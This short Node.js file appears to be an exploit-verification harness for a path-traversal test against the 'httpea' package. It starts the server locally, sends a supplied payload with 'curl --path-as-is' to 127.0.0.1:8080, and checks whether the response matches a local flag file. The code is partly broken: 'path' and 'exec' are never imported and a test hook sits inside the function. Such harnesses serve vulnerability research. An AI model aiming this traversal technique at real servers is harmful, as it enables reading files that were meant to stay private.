const { execSync } = require("child_process");
const fs = require("fs");
const sleep = require("sleep");

function exploitFunction(payload) {
  afterAll(() => {
    try {
      execSync("fuser -k 8080/tcp");
    } catch (e) {}
  });

  const pathToFlag = path.resolve(__dirname, "../flag.html");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = "node ./node_modules/httpea/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8080${payload}"`;
  exec(attack_string, (error, stdout) => {
    if (stdout === hostsFile) {
      console.log("Payload successfully exploited!");
    } else {
      console.error("Exploit failed.");
    }
  });
}

module.exports = { exploitFunction };